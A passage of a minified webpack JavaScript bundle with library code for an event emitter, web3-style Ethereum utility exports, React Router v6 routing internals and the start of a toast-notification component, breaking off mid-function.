                                u[l].fn.apply(u[l].context, c)
                        }
                    }
                    return !0
                }, s.prototype.on = function(e, t, n) {
                    return o(this, e, t, n, !1)
                }, s.prototype.once = function(e, t, n) {
                    return o(this, e, t, n, !0)
                }, s.prototype.removeListener = function(e, t, r, i) {
                    var o = n ? n + e : e;
                    if (!this._events[o]) return this;
                    if (!t) return a(this, o), this;
                    var s = this._events[o];
                    if (s.fn) s.fn !== t || i && !s.once || r && s.context !== r || a(this, o);
                    else {
                        for (var c = 0, l = [], u = s.length; c < u; c++)(s[c].fn !== t || i && !s[c].once || r && s[c].context !== r) && l.push(s[c]);
                        l.length ? this._events[o] = 1 === l.length ? l[0] : l : a(this, o)
                    }
                    return this
                }, s.prototype.removeAllListeners = function(e) {
                    var t;
                    return e ? (t = n ? n + e : e, this._events[t] && a(this, t)) : (this._events = new r, this._eventsCount = 0), this
                }, s.prototype.off = s.prototype.removeListener, s.prototype.addListener = s.prototype.on, s.prefixed = n, s.EventEmitter = s, e.exports = s
            }
        },
        t = {};

    function n(r) {
        var i = t[r];
        if (void 0 !== i) return i.exports;
        var o = t[r] = {
            exports: {}
        };
        return e[r].call(o.exports, o, o.exports, n), o.exports
    }(() => {
        var e, t = Object.getPrototypeOf ? e => Object.getPrototypeOf(e) : e => e.__proto__;
        n.t = function(r, i) {
            if (1 & i && (r = this(r)), 8 & i) return r;
            if ("object" === typeof r && r) {
                if (4 & i && r.__esModule) return r;
                if (16 & i && "function" === typeof r.then) return r
            }
            var o = Object.create(null);
            n.r(o);
            var a = {};
            e = e || [null, t({}), t([]), t(t)];
            for (var s = 2 & i && r;
                "object" == typeof s && !~e.indexOf(s); s = t(s)) Object.getOwnPropertyNames(s).forEach((e => a[e] = () => r[e]));
            return a.default = () => r, n.d(o, a), o
        }
    })(), n.d = (e, t) => {
        for (var r in t) n.o(t, r) && !n.o(e, r) && Object.defineProperty(e, r, {
            enumerable: !0,
            get: t[r]
        })
    }, n.g = function() {
        if ("object" === typeof globalThis) return globalThis;
        try {
            return this || new Function("return this")()
        } catch (e) {
            if ("object" === typeof window) return window
        }
    }(), n.o = (e, t) => Object.prototype.hasOwnProperty.call(e, t), n.r = e => {
        "undefined" !== typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
            value: "Module"
        }), Object.defineProperty(e, "__esModule", {
            value: !0
        })
    }, (() => {
        "use strict";
        var e = {};
        n.r(e), n.d(e, {
            abiSchemaToJsonSchema: () => Ma,
            codePointToInt: () => Da,
            ensureIfUint8Array: () => Va,
            ethAbiToJsonSchema: () => ja,
            fetchArrayElement: () => Fa,
            hexToNumber: () => Ha,
            hexToUint8Array: () => Wa,
            numberToHex: () => Ua,
            padLeft: () => za,
            parseBaseType: () => Oa,
            transformJsonDataToAbiFormat: () => La,
            uint8ArrayToHexString: () => Ga
        });
        var t = {};
        n.r(t), n.d(t, {
            isBatchRequest: () => il,
            isBatchResponse: () => $c,
            isResponseRpcError: () => Wc,
            isResponseWithError: () => Zc,
            isResponseWithNotification: () => Kc,
            isResponseWithResult: () => Vc,
            isSubscriptionResult: () => Jc,
            isValidResponse: () => Xc,
            setRequestIdStart: () => tl,
            toBatchPayload: () => rl,
            toPayload: () => nl,
            validateResponse: () => Yc
        });
        var r = {};
        n.r(r), n.d(r, {
            ChunkResponseParser: () => cl,
            Eip1193Provider: () => ul,
            EventEmitter: () => Ks,
            SocketProvider: () => hl,
            Web3DeferredPromise: () => sl,
            asciiToHex: () => js,
            bytesToHex: () => As,
            bytesToUint8Array: () => ws,
            checkAddressCheckSum: () => Xs,
            compareBlockNumbers: () => ac,
            convert: () => Ac,
            convertScalarValue: () => wc,
            encodePacked: () => Nc,
            ethUnitMap: () => ys,
            format: () => kc,
            fromAscii: () => Fs,
            fromDecimal: () => _s,
            fromTwosComplement: () => gc,
            fromUtf8: () => Ts,
            fromWei: () => Gs,
            getStorageSlotNumForLongString: () => Mc,
            hexToAscii: () => Ls,
            hexToBytes: () => ks,
            hexToNumber: () => Es,
            hexToNumberString: () => Is,
            hexToString: () => Ms,
            hexToUtf8: () => Ns,
            isAddress: () => $s,
            isBatchRequest: () => il,
            isBatchResponse: () => $c,
            isBloom: () => ec,
            isContractAddressInBloom: () => rc,
            isContractInitOptions: () => sc,
            isDataFormat: () => yc,
            isHex: () => Ys,
            isHexStrict: () => Js,
            isInBloom: () => tc,
            isNullish: () => cc,
            isPromise: () => Dc,
            isResponseRpcError: () => Wc,
            isResponseWithError: () => Zc,
            isResponseWithNotification: () => Kc,
            isResponseWithResult: () => Vc,
            isSubscriptionResult: () => Jc,
            isTopic: () => ic,
            isTopicInBloom: () => oc,
            isUint8Array: () => ms,
            isUserEthereumAddressInBloom: () => nc,
            isValidResponse: () => Xc,
            jsonRpc: () => t,
            keccak256: () => Sc,
            keccak256Wrapper: () => Sc,
            leftPad: () => pc,
            mergeDeep: () => uc,
            numberToHex: () => Cs,
            padLeft: () => dc,
            padRight: () => fc,
            pollTillDefined: () => zc,
            pollTillDefinedAndReturnIntervalId: () => Uc,
            processSolidityEncodePackedArgs: () => Bc,
            randomBytes: () => jc,
            randomHex: () => Fc,
            rejectIfConditionAtInterval: () => qc,
            rejectIfTimeout: () => Gc,
            rightPad: () => hc,
            setRequestIdStart: () => tl,
            sha3: () => Cc,
            sha3Raw: () => _c,
            soliditySha3: () => Oc,
            soliditySha3Raw: () => Rc,
            stringToHex: () => Bs,
            toAscii: () => Ds,
            toBatchPayload: () => rl,
            toBigInt: () => zs,
            toBool: () => Ws,
            toChecksumAddress: () => Qs,
            toDecimal: () => Ss,
            toHex: () => Hs,
            toNumber: () => Us,
            toPayload: () => nl,
            toTwosComplement: () => mc,
            toUtf8: () => Os,
            toWei: () => qs,
            uint8ArrayConcat: () => gs,
            uint8ArrayEquals: () => vs,
            utf8ToBytes: () => Rs,
            utf8ToHex: () => Ps,
            uuidV4: () => Qc,
            validateResponse: () => Yc,
            waitWithTimeout: () => Hc
        });
        var i = {};
        n.r(i), n.d(i, {
            OG: () => Bu,
            My: () => wu,
            bytesToNumberBE: () => Su,
            lX: () => Cu,
            Id: () => Tu,
            fg: () => Ru,
            qj: () => Pu,
            hexToBytes: () => Eu,
            aY: () => yu,
            lq: () => _u,
            z: () => Iu,
            Q5: () => ju
        });
        var o = {};
        n.r(o), n.d(o, {
            secp256k1: () => yd
        });
        var a, s = n(43),
            c = n.t(s, 2),
            l = n(391),
            u = n(950),
            d = n.t(u, 2);

        function f() {
            return f = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var n = arguments[t];
                    for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
                }
                return e
            }, f.apply(this, arguments)
        }! function(e) {
            e.Pop = "POP", e.Push = "PUSH", e.Replace = "REPLACE"
        }(a || (a = {}));
        const h = "popstate";

        function p(e, t) {
            if (!1 === e || null === e || "undefined" === typeof e) throw new Error(t)
        }

        function m(e, t) {
            if (!e) {
                "undefined" !== typeof console && console.warn(t);
                try {
                    throw new Error(t)
                } catch (n) {}
            }
        }

        function g(e, t) {
            return {
                usr: e.state,
                key: e.key,
                idx: t
            }
        }

        function v(e, t, n, r) {
            return void 0 === n && (n = null), f({
                pathname: "string" === typeof e ? e : e.pathname,
                search: "",
                hash: ""
            }, "string" === typeof t ? b(t) : t, {
                state: n,
                key: t && t.key || r || Math.random().toString(36).substr(2, 8)
            })
        }

        function y(e) {
            let {
                pathname: t = "/",
                search: n = "",
                hash: r = ""
            } = e;
            return n && "?" !== n && (t += "?" === n.charAt(0) ? n : "?" + n), r && "#" !== r && (t += "#" === r.charAt(0) ? r : "#" + r), t
        }

        function b(e) {
            let t = {};
            if (e) {
                let n = e.indexOf("#");
                n >= 0 && (t.hash = e.substr(n), e = e.substr(0, n));
                let r = e.indexOf("?");
                r >= 0 && (t.search = e.substr(r), e = e.substr(0, r)), e && (t.pathname = e)
            }
            return t
        }

        function w(e, t, n, r) {
            void 0 === r && (r = {});
            let {
                window: i = document.defaultView,
                v5Compat: o = !1
            } = r, s = i.history, c = a.Pop, l = null, u = d();

            function d() {
                return (s.state || {
                    idx: null
                }).idx
            }

            function m() {
                c = a.Pop;
                let e = d(),
                    t = null == e ? null : e - u;
                u = e, l && l({
                    action: c,
                    location: w.location,
                    delta: t
                })
            }

            function b(e) {
                let t = "null" !== i.location.origin ? i.location.origin : i.location.href,
                    n = "string" === typeof e ? e : y(e);
                return n = n.replace(/ $/, "%20"), p(t, "No window.location.(origin|href) available to create URL for href: " + n), new URL(n, t)
            }
            null == u && (u = 0, s.replaceState(f({}, s.state, {
                idx: u
            }), ""));
            let w = {
                get action() {
                    return c
                },
                get location() {
                    return e(i, s)
                },
                listen(e) {
                    if (l) throw new Error("A history only accepts one active listener");
                    return i.addEventListener(h, m), l = e, () => {
                        i.removeEventListener(h, m), l = null
                    }
                },
                createHref: e => t(i, e),
                createURL: b,
                encodeLocation(e) {
                    let t = b(e);
                    return {
                        pathname: t.pathname,
                        search: t.search,
                        hash: t.hash
                    }
                },
                push: function(e, t) {
                    c = a.Push;
                    let r = v(w.location, e, t);
                    n && n(r, e), u = d() + 1;
                    let f = g(r, u),
                        h = w.createHref(r);
                    try {
                        s.pushState(f, "", h)
                    } catch (p) {
                        if (p instanceof DOMException && "DataCloneError" === p.name) throw p;
                        i.location.assign(h)
                    }
                    o && l && l({
                        action: c,
                        location: w.location,
                        delta: 1
                    })
                },
                replace: function(e, t) {
                    c = a.Replace;
                    let r = v(w.location, e, t);
                    n && n(r, e), u = d();
                    let i = g(r, u),
                        f = w.createHref(r);
                    s.replaceState(i, "", f), o && l && l({
                        action: c,
                        location: w.location,
                        delta: 0
                    })
                },
                go: e => s.go(e)
            };
            return w
        }
        var x;
        ! function(e) {
            e.data = "data", e.deferred = "deferred", e.redirect = "redirect", e.error = "error"
        }(x || (x = {}));
        new Set(["lazy", "caseSensitive", "path", "id", "index", "children"]);

        function A(e, t, n) {
            void 0 === n && (n = "/");
            let r = j(("string" === typeof t ? b(t) : t).pathname || "/", n);
            if (null == r) return null;
            let i = k(e);
            ! function(e) {
                e.sort(((e, t) => e.score !== t.score ? t.score - e.score : function(e, t) {
                    let n = e.length === t.length && e.slice(0, -1).every(((e, n) => e === t[n]));
                    return n ? e[e.length - 1] - t[t.length - 1] : 0
                }(e.routesMeta.map((e => e.childrenIndex)), t.routesMeta.map((e => e.childrenIndex)))))
            }(i);
            let o = null;
            for (let a = 0; null == o && a < i.length; ++a) {
                let e = M(r);
                o = O(i[a], e)
            }
            return o
        }

        function k(e, t, n, r) {
            void 0 === t && (t = []), void 0 === n && (n = []), void 0 === r && (r = "");
            let i = (e, i, o) => {
                let a = {
                    relativePath: void 0 === o ? e.path || "" : o,
                    caseSensitive: !0 === e.caseSensitive,
                    childrenIndex: i,
                    route: e
                };
                a.relativePath.startsWith("/") && (p(a.relativePath.startsWith(r), 'Absolute route path "' + a.relativePath + '" nested under path "' + r + '" is not valid. An absolute child route path must start with the combined path of all its parent routes.'), a.relativePath = a.relativePath.slice(r.length));
                let s = F([r, a.relativePath]),
                    c = n.concat(a);
                e.children && e.children.length > 0 && (p(!0 !== e.index, 'Index routes must not have child routes. Please remove all child routes from route path "' + s + '".'), k(e.children, t, c, s)), (null != e.path || e.index) && t.push({
                    path: s,
                    score: N(s, e.index),
                    routesMeta: c
                })
            };
            return e.forEach(((e, t) => {
                var n;
                if ("" !== e.path && null != (n = e.path) && n.includes("?"))
                    for (let r of E(e.path)) i(e, t, r);
                else i(e, t)
            })), t
        }

        function E(e) {
            let t = e.split("/");
            if (0 === t.length) return [];
            let [n, ...r] = t, i = n.endsWith("?"), o = n.replace(/\?$/, "");
            if (0 === r.length) return i ? [o, ""] : [o];
            let a = E(r.join("/")),
                s = [];
            return s.push(...a.map((e => "" === e ? o : [o, e].join("/")))), i && s.push(...a), s.map((t => e.startsWith("/") && "" === t ? "/" : t))
        }
        const S = /^:[\w-]+$/,
            C = 3,
            _ = 2,
            I = 1,
            P = 10,
            T = -2,
            B = e => "*" === e;

        function N(e, t) {
            let n = e.split("/"),
                r = n.length;
            return n.some(B) && (r += T), t && (r += _), n.filter((e => !B(e))).reduce(((e, t) => e + (S.test(t) ? C : "" === t ? I : P)), r)
        }

        function O(e, t) {
            let {
                routesMeta: n
            } = e, r = {}, i = "/", o = [];
            for (let a = 0; a < n.length; ++a) {
                let e = n[a],
                    s = a === n.length - 1,
                    c = "/" === i ? t : t.slice(i.length) || "/",
                    l = R({
                        path: e.relativePath,
                        caseSensitive: e.caseSensitive,
                        end: s
                    }, c);
                if (!l) return null;
                Object.assign(r, l.params);
                let u = e.route;
                o.push({
                    params: r,
                    pathname: F([i, l.pathname]),
                    pathnameBase: L(F([i, l.pathnameBase])),
                    route: u
                }), "/" !== l.pathnameBase && (i = F([i, l.pathnameBase]))
            }
            return o
        }

        function R(e, t) {
            "string" === typeof e && (e = {
                path: e,
                caseSensitive: !1,
                end: !0
            });
            let [n, r] = function(e, t, n) {
                void 0 === t && (t = !1);
                void 0 === n && (n = !0);
                m("*" === e || !e.endsWith("*") || e.endsWith("/*"), 'Route path "' + e + '" will be treated as if it were "' + e.replace(/\*$/, "/*") + '" because the `*` character must always follow a `/` in the pattern. To get rid of this warning, please change the route path to "' + e.replace(/\*$/, "/*") + '".');
                let r = [],
                    i = "^" + e.replace(/\/*\*?$/, "").replace(/^\/*/, "/").replace(/[\\.*+^${}|()[\]]/g, "\\$&").replace(/\/:([\w-]+)(\?)?/g, ((e, t, n) => (r.push({
                        paramName: t,
                        isOptional: null != n
                    }), n ? "/?([^\\/]+)?" : "/([^\\/]+)")));
                e.endsWith("*") ? (r.push({
                    paramName: "*"
                }), i += "*" === e || "/*" === e ? "(.*)$" : "(?:\\/(.+)|\\/*)$") : n ? i += "\\/*$" : "" !== e && "/" !== e && (i += "(?:(?=\\/|$))");
                let o = new RegExp(i, t ? void 0 : "i");
                return [o, r]
            }(e.path, e.caseSensitive, e.end), i = t.match(n);
            if (!i) return null;
            let o = i[0],
                a = o.replace(/(.)\/+$/, "$1"),
                s = i.slice(1);
            return {
                params: r.reduce(((e, t, n) => {
                    let {
                        paramName: r,
                        isOptional: i
                    } = t;
                    if ("*" === r) {
                        let e = s[n] || "";
                        a = o.slice(0, o.length - e.length).replace(/(.)\/+$/, "$1")
                    }
                    const c = s[n];
                    return e[r] = i && !c ? void 0 : (c || "").replace(/%2F/g, "/"), e
                }), {}),
                pathname: o,
                pathnameBase: a,
                pattern: e
            }
        }

        function M(e) {
            try {
                return e.split("/").map((e => decodeURIComponent(e).replace(/\//g, "%2F"))).join("/")
            } catch (t) {
                return m(!1, 'The URL path "' + e + '" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent encoding (' + t + ")."), e
            }
        }

        function j(e, t) {
            if ("/" === t) return e;
            if (!e.toLowerCase().startsWith(t.toLowerCase())) return null;
            let n = t.endsWith("/") ? t.length - 1 : t.length,
                r = e.charAt(n);
            return r && "/" !== r ? null : e.slice(n) || "/"
        }
        const F = e => e.join("/").replace(/\/\/+/g, "/"),
            L = e => e.replace(/\/+$/, "").replace(/^\/*/, "/");
        Error;

        function D(e) {
            return null != e && "number" === typeof e.status && "string" === typeof e.statusText && "boolean" === typeof e.internal && "data" in e
        }
        const H = ["post", "put", "patch", "delete"],
            U = (new Set(H), ["get", ...H]);
        new Set(U), new Set([301, 302, 303, 307, 308]), new Set([307, 308]);
        Symbol("deferred");

        function z() {
            return z = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var n = arguments[t];
                    for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
                }
                return e
            }, z.apply(this, arguments)
        }
        const G = s.createContext(null);
        const q = s.createContext(null);
        const Q = s.createContext(null);
        const W = s.createContext(null);
        const V = s.createContext({
            outlet: null,
            matches: [],
            isDataRoute: !1
        });
        const Z = s.createContext(null);

        function K() {
            return null != s.useContext(W)
        }

        function J() {
            return K() || p(!1), s.useContext(W).location
        }

        function Y(e, t, n, r) {
            K() || p(!1);
            let {
                navigator: i
            } = s.useContext(Q), {
                matches: o
            } = s.useContext(V), c = o[o.length - 1], l = c ? c.params : {}, u = (c && c.pathname, c ? c.pathnameBase : "/");
            c && c.route;
            let d, f = J();
            if (t) {
                var h;
                let e = "string" === typeof t ? b(t) : t;
                "/" === u || (null == (h = e.pathname) ? void 0 : h.startsWith(u)) || p(!1), d = e
            } else d = f;
            let m = d.pathname || "/",
                g = m;
            if ("/" !== u) {
                let e = u.replace(/^\//, "").split("/");
                g = "/" + m.replace(/^\//, "").split("/").slice(e.length).join("/")
            }
            let v = A(e, {
                pathname: g
            });
            let y = ne(v && v.map((e => Object.assign({}, e, {
                params: Object.assign({}, l, e.params),
                pathname: F([u, i.encodeLocation ? i.encodeLocation(e.pathname).pathname : e.pathname]),
                pathnameBase: "/" === e.pathnameBase ? u : F([u, i.encodeLocation ? i.encodeLocation(e.pathnameBase).pathname : e.pathnameBase])
            }))), o, n, r);
            return t && y ? s.createElement(W.Provider, {
                value: {
                    location: z({
                        pathname: "/",
                        search: "",
                        hash: "",
                        state: null,
                        key: "default"
                    }, d),
                    navigationType: a.Pop
                }
            }, y) : y
        }

        function X() {
            let e = function() {
                    var e;
                    let t = s.useContext(Z),
                        n = ie(re.UseRouteError),
                        r = oe(re.UseRouteError);
                    if (void 0 !== t) return t;
                    return null == (e = n.errors) ? void 0 : e[r]
                }(),
                t = D(e) ? e.status + " " + e.statusText : e instanceof Error ? e.message : JSON.stringify(e),
                n = e instanceof Error ? e.stack : null,
                r = "rgba(200,200,200, 0.5)",
                i = {
                    padding: "0.5rem",
                    backgroundColor: r
                };
            return s.createElement(s.Fragment, null, s.createElement("h2", null, "Unexpected Application Error!"), s.createElement("h3", {
                style: {
                    fontStyle: "italic"
                }
            }, t), n ? s.createElement("pre", {
                style: i
            }, n) : null, null)
        }
        const $ = s.createElement(X, null);
        class ee extends s.Component {
            constructor(e) {
                super(e), this.state = {
                    location: e.location,
                    revalidation: e.revalidation,
                    error: e.error
                }
            }
            static getDerivedStateFromError(e) {
                return {
                    error: e
                }
            }
            static getDerivedStateFromProps(e, t) {
                return t.location !== e.location || "idle" !== t.revalidation && "idle" === e.revalidation ? {
                    error: e.error,
                    location: e.location,
                    revalidation: e.revalidation
                } : {
                    error: void 0 !== e.error ? e.error : t.error,
                    location: t.location,
                    revalidation: e.revalidation || t.revalidation
                }
            }
            componentDidCatch(e, t) {
                console.error("React Router caught the following error during render", e, t)
            }
            render() {
                return void 0 !== this.state.error ? s.createElement(V.Provider, {
                    value: this.props.routeContext
                }, s.createElement(Z.Provider, {
                    value: this.state.error,
                    children: this.props.component
                })) : this.props.children
            }
        }

        function te(e) {
            let {
                routeContext: t,
                match: n,
                children: r
            } = e, i = s.useContext(G);
            return i && i.static && i.staticContext && (n.route.errorElement || n.route.ErrorBoundary) && (i.staticContext._deepestRenderedBoundaryId = n.route.id), s.createElement(V.Provider, {
                value: t
            }, r)
        }

        function ne(e, t, n, r) {
            var i;
            if (void 0 === t && (t = []), void 0 === n && (n = null), void 0 === r && (r = null), null == e) {
                var o;
                if (null == (o = n) || !o.errors) return null;
                e = n.matches
            }
            let a = e,
                c = null == (i = n) ? void 0 : i.errors;
            if (null != c) {
                let e = a.findIndex((e => e.route.id && (null == c ? void 0 : c[e.route.id])));
                e >= 0 || p(!1), a = a.slice(0, Math.min(a.length, e + 1))
            }
            let l = !1,
                u = -1;
            if (n && r && r.v7_partialHydration)
                for (let s = 0; s < a.length; s++) {
                    let e = a[s];
                    if ((e.route.HydrateFallback || e.route.hydrateFallbackElement) && (u = s), e.route.id) {
                        let {
                            loaderData: t,
                            errors: r
                        } = n, i = e.route.loader && void 0 === t[e.route.id] && (!r || void 0 === r[e.route.id]);
                        if (e.route.lazy || i) {
                            l = !0, a = u >= 0 ? a.slice(0, u + 1) : [a[0]];
                            break
                        }
                    }
                }
            return a.reduceRight(((e, r, i) => {
                let o, d = !1,
                    f = null,
                    h = null;
                var p;
                n && (o = c && r.route.id ? c[r.route.id] : void 0, f = r.route.errorElement || $, l && (u < 0 && 0 === i ? (p = "route-fallback", !1 || ae[p] || (ae[p] = !0), d = !0, h = null) : u === i && (d = !0, h = r.route.hydrateFallbackElement || null)));
                let m = t.concat(a.slice(0, i + 1)),
                    g = () => {
                        let t;
                        return t = o ? f : d ? h : r.route.Component ? s.createElement(r.route.Component, null) : r.route.element ? r.route.element : e, s.createElement(te, {
                            match: r,
                            routeContext: {
                                outlet: e,
                                matches: m,
                                isDataRoute: null != n
                            },
                            children: t
                        })
                    };
                return n && (r.route.ErrorBoundary || r.route.errorElement || 0 === i) ? s.createElement(ee, {
                    location: n.location,
                    revalidation: n.revalidation,
                    component: f,
                    error: o,
                    children: g(),
                    routeContext: {
                        outlet: null,
                        matches: m,
                        isDataRoute: !0
                    }
                }) : g()
            }), null)
        }
        var re = function(e) {
            return e.UseBlocker = "useBlocker", e.UseLoaderData = "useLoaderData", e.UseActionData = "useActionData", e.UseRouteError = "useRouteError", e.UseNavigation = "useNavigation", e.UseRouteLoaderData = "useRouteLoaderData", e.UseMatches = "useMatches", e.UseRevalidator = "useRevalidator", e.UseNavigateStable = "useNavigate", e.UseRouteId = "useRouteId", e
        }(re || {});

        function ie(e) {
            let t = s.useContext(q);
            return t || p(!1), t
        }

        function oe(e) {
            let t = function(e) {
                    let t = s.useContext(V);
                    return t || p(!1), t
                }(),
                n = t.matches[t.matches.length - 1];
            return n.route.id || p(!1), n.route.id
        }
        const ae = {};
        c.startTransition;

        function se(e) {
            p(!1)
        }

        function ce(e) {
            let {
                basename: t = "/",
                children: n = null,
                location: r,
                navigationType: i = a.Pop,
                navigator: o,
                static: c = !1,
                future: l
            } = e;
            K() && p(!1);
            let u = t.replace(/^\/*/, "/"),
                d = s.useMemo((() => ({
                    basename: u,
                    navigator: o,
                    static: c,
                    future: z({
                        v7_relativeSplatPath: !1
                    }, l)
                })), [u, l, o, c]);
            "string" === typeof r && (r = b(r));
            let {
                pathname: f = "/",
                search: h = "",
                hash: m = "",
                state: g = null,
                key: v = "default"
            } = r, y = s.useMemo((() => {
                let e = j(f, u);
                return null == e ? null : {
                    location: {
                        pathname: e,
                        search: h,
                        hash: m,
                        state: g,
                        key: v
                    },
                    navigationType: i
                }
            }), [u, f, h, m, g, v, i]);
            return null == y ? null : s.createElement(Q.Provider, {
                value: d
            }, s.createElement(W.Provider, {
                children: n,
                value: y
            }))
        }

        function le(e) {
            let {
                children: t,
                location: n
            } = e;
            return Y(ue(t), n)
        }
        new Promise((() => {}));
        s.Component;

        function ue(e, t) {
            void 0 === t && (t = []);
            let n = [];
            return s.Children.forEach(e, ((e, r) => {
                if (!s.isValidElement(e)) return;
                let i = [...t, r];
                if (e.type === s.Fragment) return void n.push.apply(n, ue(e.props.children, i));
                e.type !== se && p(!1), e.props.index && e.props.children && p(!1);
                let o = {
                    id: e.props.id || i.join("-"),
                    caseSensitive: e.props.caseSensitive,
                    element: e.props.element,
                    Component: e.props.Component,
                    index: e.props.index,
                    path: e.props.path,
                    loader: e.props.loader,
                    action: e.props.action,
                    errorElement: e.props.errorElement,
                    ErrorBoundary: e.props.ErrorBoundary,
                    hasErrorBoundary: null != e.props.ErrorBoundary || null != e.props.errorElement,
                    shouldRevalidate: e.props.shouldRevalidate,
                    handle: e.props.handle,
                    lazy: e.props.lazy
                };
                e.props.children && (o.children = ue(e.props.children, i)), n.push(o)
            })), n
        }
        new Set(["application/x-www-form-urlencoded", "multipart/form-data", "text/plain"]);
        try {
            window.__reactRouterVersion = "6"
        } catch (Qy) {}
        new Map;
        const de = c.startTransition;
        d.flushSync, c.useId;

        function fe(e) {
            let {
                basename: t,
                children: n,
                future: r,
                window: i
            } = e, o = s.useRef();
            var a;
            null == o.current && (o.current = (void 0 === (a = {
                window: i,
                v5Compat: !0
            }) && (a = {}), w((function(e, t) {
                let {
                    pathname: n,
                    search: r,
                    hash: i
                } = e.location;
                return v("", {
                    pathname: n,
                    search: r,
                    hash: i
                }, t.state && t.state.usr || null, t.state && t.state.key || "default")
            }), (function(e, t) {
                return "string" === typeof t ? t : y(t)
            }), null, a)));
            let c = o.current,
                [l, u] = s.useState({
                    action: c.action,
                    location: c.location
                }),
                {
                    v7_startTransition: d
                } = r || {},
                f = s.useCallback((e => {
                    d && de ? de((() => u(e))) : u(e)
                }), [u, d]);
            return s.useLayoutEffect((() => c.listen(f)), [c, f]), s.createElement(ce, {
                basename: t,
                children: n,
                location: l.location,
                navigationType: l.action,
                navigator: c,
                future: r
            })
        }
        "undefined" !== typeof window && "undefined" !== typeof window.document && window.document.createElement;
        var he, pe;
        (function(e) {
            e.UseScrollRestoration = "useScrollRestoration", e.UseSubmit = "useSubmit", e.UseSubmitFetcher = "useSubmitFetcher", e.UseFetcher = "useFetcher", e.useViewTransitionState = "useViewTransitionState"
        })(he || (he = {})),
        function(e) {
            e.UseFetcher = "useFetcher", e.UseFetchers = "useFetchers", e.UseScrollRestoration = "useScrollRestoration"
        }(pe || (pe = {}));

        function me(e) {
            var t, n, r = "";
            if ("string" == typeof e || "number" == typeof e) r += e;
            else if ("object" == typeof e)
                if (Array.isArray(e)) {
                    var i = e.length;
                    for (t = 0; t < i; t++) e[t] && (n = me(e[t])) && (r && (r += " "), r += n)
                } else
                    for (n in e) e[n] && (r && (r += " "), r += n);
            return r
        }
        const ge = function() {
                for (var e, t, n = 0, r = "", i = arguments.length; n < i; n++)(e = arguments[n]) && (t = me(e)) && (r && (r += " "), r += t);
                return r
            },
            ve = e => "number" == typeof e && !isNaN(e),
            ye = e => "string" == typeof e,
            be = e => "function" == typeof e,
            we = e => ye(e) || be(e) ? e : null,
            xe = e => (0, s.isValidElement)(e) || ye(e) || be(e) || ve(e);

        function Ae(e) {
            let {
                enter: t,
                exit: n,
                appendPosition: r = !1,
                collapse: i = !0,
                collapseDuration: o = 300
            } = e;
            return function(e) {
                let {
                    children: a,
                    position: c,
                    preventExitTransition: l,
                    done: u,
                    nodeRef: d,
                    isIn: f,
                    playToast: h
                } = e;
                const p = r ? "".concat(t, "--").concat(c) : t,
                    m = r ? "".concat(n, "--").concat(c) : n,
                    g = (0, s.useRef)(0);
                return (0, s.useLayoutEffect)((() => {
                    const e = d.current,
                        t = p.split(" "),
                        n = r => {
                            r.target === d.current && (h(), e.removeEventListener("animationend", n), e.removeEventListener("animationcancel", n), 0 === g.current && "animationcancel" !== r.type && e.classList.remove(...t))
                        };
                    e.classList.add(...t), e.addEventListener("animationend", n), e.addEventListener("animationcancel", n)
                }), []), (0, s.useEffect)((() => {
                    const e = d.current,
                        t = () => {
                            e.removeEventListener("animationend", t), i ? function(e, t, n) {
                                void 0 === n && (n = 300);
                                const {
                                    scrollHeight: r,
                                    style: i
                                } = e;
                                requestAnimationFrame((() => {
                                    i.minHeight = "initial", i.height = r + "px", i.transition = "all ".concat(n, "ms"), requestAnimationFrame((() => {
                                        i.height = "0", i.padding = "0", i.margin = "0", setTimeout(t, n)
                                    }))
                                }))
                            }(e, u, o) : u()
                        };
                    f || (l ? t() : (g.current = 1, e.className += " ".concat(m), e.addEventListener("animationend", t)))
                }), [f]), s.createElement(s.Fragment, null, a)
            }
        }

        function ke(e, t) {
            return null != e ? {
                content: e.content,
                containerId: e.props.containerId,
                id: e.props.toastId,
                theme: e.props.theme,
                type: e.props.type,
                data: e.props.data || {},
                isLoading: e.props.isLoading,
                icon: e.props.icon,
                status: t
            } : {}
        }
        const Ee = new Map;
        let Se = [];
        const Ce = new Set,
            _e = e => Ce.forEach((t => t(e))),
            Ie = () => Ee.size > 0;

        function Pe(e, t) {
            var n;
            if (t) return !(null == (n = Ee.get(t)) || !n.isToastActive(e));
            let r = !1;
            return Ee.forEach((t => {
                t.isToastActive(e) && (r = !0)
            })), r
        }

        function Te(e, t) {
            xe(e) && (Ie() || Se.push({
                content: e,
                options: t
            }), Ee.forEach((n => {
                n.buildToast(e, t)
            })))
        }

        function Be(e, t) {
            Ee.forEach((n => {
                null != t && null != t && t.containerId ? (null == t ? void 0 : t.containerId) === n.id && n.toggle(e, null == t ? void 0 : t.id) : n.toggle(e, null == t ? void 0 : t.id)
            }))
        }

        function Ne(e) {
            const {
                subscribe: t,
                getSnapshot: n,
                setProps: r
            } = (0, s.useRef)(function(e) {
                const t = e.containerId || 1;
                return {
                    subscribe(n) {
                        const r = function(e, t, n) {
                            let r = 1,
                                i = 0,
                                o = [],
                                a = [],
                                c = [],
                                l = t;
                            const u = new Map,
                                d = new Set,
                                f = () => {
                                    c = Array.from(u.values()), d.forEach((e => e()))
                                },
                                h = e => {
                                    a = null == e ? [] : a.filter((t => t !== e)), f()
                                },
                                p = e => {
                                    const {
                                        toastId: t,
                                        onOpen: r,
                                        updateId: i,
                                        children: o
                                    } = e.props, c = null == i;
                                    e.staleId && u.delete(e.staleId), u.set(t, e), a = [...a, e.props.toastId].filter((t => t !== e.staleId)), f(), n(ke(e, c ? "added" : "updated")), c && be(r) && r((0, s.isValidElement)(o) && o.props)
                                };
                            return {
                                id: e,
                                props: l,
                                observe: e => (d.add(e), () => d.delete(e)),
                                toggle: (e, t) => {
                                    u.forEach((n => {
                                        null != t && t !== n.props.toastId || be(n.toggle) && n.toggle(e)
                                    }))
                                },
                                removeToast: h,
                                toasts: u,
                                clearQueue: () => {
                                    i -= o.length, o = []
                                },
                                buildToast: (t, a) => {
                                    if ((t => {
                                            let {
                                                containerId: n,
                                                toastId: r,
                                                updateId: i
                                            } = t;
                                            const o = n ? n !== e : 1 !== e,
                                                a = u.has(r) && null == i;
                                            return o || a
                                        })(a)) return;
